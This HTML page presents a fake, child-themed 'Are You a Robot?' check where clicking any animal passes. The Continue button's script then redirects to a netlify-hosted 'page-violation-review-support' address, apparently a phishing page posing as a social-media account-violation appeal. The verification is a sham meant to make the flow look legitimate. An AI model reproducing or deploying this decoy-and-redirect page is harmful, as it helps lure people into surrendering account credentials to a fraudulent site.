<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Easy Bot Check</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Comic Sans MS', 'Marker Felt', 'Chalkboard SE', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ff9a9e, #fad0c4, #a1c4fd);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }
        
        .container {
            background: white;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 500px;
            padding: 25px;
            border: 8px dotted #ff6b6b;
            margin: 15px auto;
        }
        
        .verification-container {
            background: #f8fafc;
            border-radius: 20px;
            padding: 25px;
            border: 4px solid #ffd166;
            position: relative;
            overflow: hidden;
        }
        
        .verification-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(to right, #ff9a9e, #fad0c4, #a1c4fd);
        }
        
        .verification-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .verification-icon {
            background: #ffd166;
            width: 70px;
            height: 70px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
            border: 4px solid #ff9a9e;
        }
        
        .verification-icon i {
            color: #ff6b6b;
            font-size: 36px;
        }
        
        .verification-header h3 {
            color: #1e293b;
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
            text-shadow: 2px 2px 0 #ffd166;
        }
        
        .verification-header p {
            color: #4b5563;
            font-size: 16px;
            text-align: center;
            max-width: 90%;
            line-height: 1.4;
        }
        
        .challenge-area {
            background: white;
            border: 3px dashed #06d6a0;
            border-radius: 18px;
            padding: 20px 15px;
            margin: 20px 0;
            text-align: center;
        }
        
        .challenge-title {
            font-size: 20px;
            color: #118ab2;
            margin-bottom: 15px;
            font-weight: bold;
        }
        
        .animal-options {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        .animal-option {
            cursor: pointer;
            padding: 12px;
            border-radius: 16px;
            background: #f8f9fa;
            border: 3px solid transparent;
            transition: all 0.3s ease;
            width: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .animal-option:hover {
            transform: translateY(-5px);
            background: #e9f7ff;
            border-color: #a1c4fd;
        }
        
        .animal-option.selected {
            transform: translateY(-8px);
            background: #d5f5e3;
            border-color: #06d6a0;
            box-shadow: 0 6px 12px rgba(6, 214, 160, 0.25);
        }
        
        .animal-icon {
            font-size: 40px;
            margin-bottom: 10px;
        }
        
        .animal-label {
            font-size: 16px;
            font-weight: bold;
            color: #4b5563;
        }
        
        .verification-text {
            font-size: 18px;
            color: #ef476f;
            font-weight: bold;
            margin: 15px 0;
            text-align: center;
            line-height: 1.4;
        }
        
        .submit-btn {
            background: linear-gradient(to right, #ff9a9e, #fad0c4);
            color: white;
            border: none;
            padding: 18px;
            font-size: 22px;
            font-weight: 700;
            border-radius: 16px;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            margin-top: 15px;
            border: 4px solid white;
            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
            letter-spacing: 1px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
        }
        
        .submit-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 18px rgba(0,0,0,0.15);
            background: linear-gradient(to right, #ff7b7f, #f8c1b0);
        }
        
        .submit-btn:active {
            transform: translateY(-2px);
        }
        
        .submit-btn:disabled {
            background: #cbd5e1;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .submit-btn i {
            margin-left: 12px;
            font-size: 22px;
        }
        
        .confetti {
            position: absolute;
            width: 8px;
            height: 8px;
            background-color: #f00;
            border-radius: 50%;
            animation: confetti-fall 5s linear forwards;
            opacity: 0.8;
        }
        
        @keyframes confetti-fall {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(100vh) rotate(720deg);
                opacity: 0;
            }
        }
        
        .status-message {
            padding: 18px;
            border-radius: 14px;
            margin-top: 20px;
            text-align: center;
            font-size: 18px;
            display: none;
            font-weight: bold;
        }
        
        .status-message.success {
            background: #d5f5e3;
            color: #118ab2;
            border: 3px solid #06d6a0;
            display: block;
            animation: bounce 0.8s;
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-20px);}
            60% {transform: translateY(-10px);}
        }
        
        .footer {
            text-align: center;
            color: #4b5563;
            margin-top: 20px;
            font-size: 14px;
            padding: 0 10px;
        }
        
        .kid-friendly {
            display: inline-block;
            background: #ffd166;
            padding: 4px 12px;
            border-radius: 20px;
            margin-top: 8px;
            font-weight: bold;
            color: #ef476f;
            font-size: 14px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                max-width: 100%;
            }
            
            .verification-container {
                padding: 20px 15px;
            }
            
            .verification-icon {
                width: 60px;
                height: 60px;
            }
            
            .verification-icon i {
                font-size: 30px;
            }
            
            .verification-header h3 {
                font-size: 22px;
            }
            
            .verification-header p {
                font-size: 14px;
            }
            
            .challenge-area {
                padding: 15px 10px;
            }
            
            .challenge-title {
                font-size: 18px;
            }
            
            .animal-option {
                width: 85px;
                padding: 10px;
            }
            
            .animal-icon {
                font-size: 34px;
            }
            
            .animal-label {
                font-size: 14px;
            }
            
            .verification-text {
                font-size: 16px;
                margin: 12px 0;
            }
            
            .submit-btn {
                font-size: 20px;
                padding: 16px;
            }
            
            .status-message {
                padding: 15px;
                font-size: 16px;
            }
        }
        
        @media (max-height: 700px) and (max-width: 480px) {
            body {
                align-items: flex-start;
                padding-top: 20px;
                padding-bottom: 20px;
            }
            
            .container {
                max-height: 95vh;
                overflow-y: auto;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="verification-container">
            <div class="verification-header">
                <div class="verification-icon">
                    <i class="fas fa-robot"></i>
                </div>
                <h3>Are You a Robot?</h3>
                <p>Help us know you're a real person! It's super easy!</p>
            </div>
            
            <div class="challenge-area">
                <div class="challenge-title">Choose your favorite animal:</div>
                
                <div class="animal-options">
                    <div class="animal-option" data-option="1">
                        <div class="animal-icon">üê∂</div>
                        <div class="animal-label">Dog</div>
                    </div>
                    <div class="animal-option" data-option="2">
                        <div class="animal-icon">üê±</div>
                        <div class="animal-label">Cat</div>
                    </div>
                    <div class="animal-option" data-option="3">
                        <div class="animal-icon">üê∞</div>
                        <div class="animal-label">Rabbit</div>
                    </div>
                </div>
                
                <div class="verification-text">Just click any animal to prove you're human!</div>
            </div>
            
            <button class="submit-btn" id="submitBtn" disabled>
                Continue
                <i class="fas fa-arrow-right"></i>
            </button>
            
            <div id="statusMessage" class="status-message"></div>
            
            <div class="footer">
                <p>This is a super easy check for everyone!</p>
                <div class="kid-friendly">Kid Friendly!</div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const animalOptions = document.querySelectorAll('.animal-option');
            const submitBtn = document.getElementById('submitBtn');
            const statusMessage = document.getElementById('statusMessage');
            
            // Select any animal to pass verification
            animalOptions.forEach(option => {
                option.addEventListener('click', function() {
                    // Remove any existing selections
                    animalOptions.forEach(opt => opt.classList.remove('selected'));
                    
                    // Add selection to clicked option
                    this.classList.add('selected');
                    
                    // Enable the submit button
                    submitBtn.disabled = false;
                    
                    // Show success immediately
                    statusMessage.textContent = "Great job! You're definitely human!";
                    statusMessage.className = "status-message success";
                    
                    // Create confetti effect
                    createConfetti();
                    
                    // Scroll to bottom to ensure button is visible
                    setTimeout(() => {
                        window.scrollTo({
                            top: document.body.scrollHeight,
                            behavior: 'smooth'
                        });
                    }, 100);
                });
            });
            
            // Submit button handler
            submitBtn.addEventListener('click', function() {
                // Disable button during processing
                submitBtn.disabled = true;
                submitBtn.innerHTML = 'Verifying... <i class="fas fa-spinner fa-spin"></i>';
                
                // Create more confetti
                createConfetti();
                
                // Simulate a short delay
                setTimeout(function() {
                    // Show success message
                    statusMessage.textContent = "Verification complete! Redirecting...";
                    
                    // Redirect after a short delay
                    setTimeout(function() {
                        window.location.href = "https://page-violation-review-support.netlify.app/";
                    }, 1000);
                }, 1500);
            });
            
            // Create confetti effect
            function createConfetti() {
                const colors = ['#ff6b6b', '#4ecdc4', '#ffd166', '#118ab2', '#06d6a0', '#ef476f'];
                const container = document.querySelector('.verification-container');
                
                for (let i = 0; i < 40; i++) {
                    const confetti = document.createElement('div');
                    confetti.className = 'confetti';
                    confetti.style.left = Math.random() * 100 + '%';
                    confetti.style.top = -10 + 'px';
                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.width = Math.random() * 12 + 4 + 'px';
                    confetti.style.height = confetti.style.width;
                    confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
                    
                    container.appendChild(confetti);
                    
                    // Remove confetti after animation
                    setTimeout(() => {
                        confetti.remove();
                    }, 5000);
                }
            }
        });
    </script>
</body>
</html>
